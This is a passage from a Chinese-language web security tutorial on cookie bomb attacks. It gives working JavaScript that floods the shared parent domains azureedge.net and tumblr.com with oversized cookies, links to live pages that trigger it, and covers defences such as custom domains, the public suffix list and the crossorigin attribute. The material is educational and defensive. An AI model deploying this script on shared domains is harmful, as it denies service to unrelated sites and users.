class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-js codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> domain </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;azureedge.net&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> cookieCount </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">40</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> cookieLength </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">3000</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> expireAfterMinute </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">5</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">setCookieBomb</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">function</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">setCookie</span><span class="token punctuation" style="color:#393A34">(</span><span class="token parameter">key</span><span class="token parameter punctuation" style="color:#393A34">,</span><span class="token parameter"> value</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> expires </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">new</span><span class="token plain"> </span><span class="token class-name">Date</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">+</span><span class="token keyword" style="color:#00009f">new</span><span class="token plain"> </span><span class="token class-name">Date</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> expireAfterMinute </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">60</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1000</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token dom variable" style="color:#36acaa">document</span><span class="token punctuation" style="color:#393A34">.</span><span class="token property-access">cookie</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> key </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;=&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> value </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;; path=/; domain=&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> domain </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;; Secure; SameSite=None; expires=&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> expires</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">toUTCString</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">function</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">setCookieBomb</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> value </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;Boring&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;_&#x27;</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">repeat</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">cookieLength</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword control-flow" style="color:#00009f">for</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">let</span><span class="token plain"> i</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> i</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">cookieCount</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> i</span><span class="token operator" style="color:#393A34">++</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">setCookie</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;key&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> i</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> value</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="複製代碼至剪貼簿" title="複製" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>接著在 Azure 上面上傳檔案然後設置一下 CDN，就可以得到一個自訂的網址：<a href="https://hulitest2.azureedge.net/cookie.html" target="_blank" rel="noopener noreferrer">https://hulitest2.azureedge.net/cookie.html</a></p><p>點了之後就會在 <code>azureedge.net</code> 上面設置一堆垃圾 cookie：</p><p><img loading="lazy" src="/beyond-xss/assets/images/26-02-ef26c2c17aefa466b4418451d3ea3eab.png" width="1157" height="599" class="img_ev3q"></p><p>重新整理後，會發現網站真的不能存取了：</p><p><img loading="lazy" src="/beyond-xss/assets/images/26-03-6794c39c9c71964ee67f570b98a77299.png" width="1260" height="470" class="img_ev3q"></p><p>這就代表 cookie bomb 成功了。</p><p>所以只要是放在 <code>azureedge.net</code> 的資源，都會受到影響。</p><p>其實 AzureCDN 有自訂網域的功能，所以如果是自訂網域的話就不會受到影響。但有些網站並沒有使用自訂網域，而是直接使用了 <code>azureedge.net</code> 當作 URL。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="防禦方式-1">防禦方式<a href="#防禦方式-1" class="hash-link" aria-label="防禦方式的直接連結" title="防禦方式的直接連結">​</a></h2><p>最好的防禦方式就是改用自訂網域，不要用預設的 <code>azureedge.net</code>，這樣就不會有 cookie bomb 的問題。但撇開自訂網域不談，其實 <code>azureedge.net</code> 應該去註冊 public suffix 才對，才能把問題真正的解決掉。</p><p>除了這兩種防禦方式之外，還有一種你可能沒想到的。</p><p>身為前端工程師ㄝ我們平常在引入資源的時候都是這樣寫的：</p><div class="language-html codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-html codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">script</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">src</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag attr-value" style="color:#e3116c">htps://test.azureedge.net/bundle.js</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token script"></span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">script</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="複製代碼至剪貼簿" title="複製" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>只要加一個屬性 <code>crossorigin</code>，變成：</p><div class="language-html codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-html codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">script</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">src</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag attr-value" style="color:#e3116c">htps://test.azureedge.net/bundle.js</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">crossorigin</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token script"></span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">script</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="複製代碼至剪貼簿" title="複製" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>就可以避免掉 cookie bomb 的攻擊。</p><p>這是因為原本的方法在發送 request 時預設會把 cookie 帶上去，但如果加上 <code>crossorigin</code> 改成用 cross-origin 的方式去拿，預設就不會帶 cookie，所以就不會有 <code>header too large</code> 的狀況發生。</p><p>只是記得在 CDN 那邊也要調整一下，要確認 server 有加上 <code>Access-Control-Allow-Origin</code> 的 header，允許跨來源的資源請求。</p><p>以前我很困惑到底什麼情形需要加上 <code>crossorigin</code>，現在我知道其中一種了，如果你不想把 cookie 一起帶上去的話，就可以加上 <code>crossorigin</code>。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="再看一個實際的案例">再看一個實際的案例<a href="#再看一個實際的案例" class="hash-link" aria-label="再看一個實際的案例的直接連結" title="再看一個實際的案例的直接連結">​</a></h2><p>曾經在特定領域紅過，但被 Automattic 收購後便轉向的 Tumblr 有個特別的功能，那就是你可以在個人頁面自訂 CSS 與 JavaScript，而這個個人頁面的 domain 會是 userA.tumblr.com，而 tumblr.com 並沒有註冊在 public suffix 上，所以一樣會受 cookie bomb 的影響。</p><p>只要使用 Chrome 或是 Edge 造訪這個網址：<a href="https://aszx87410.tumblr.com/" target="_blank" rel="noopener noreferrer">https://aszx87410.tumblr.com/</a> 之後重新整理或者是前往 Tumblr 首頁，就會發現無法存取：</p><p><img loading="lazy" src="data:image/png;base64,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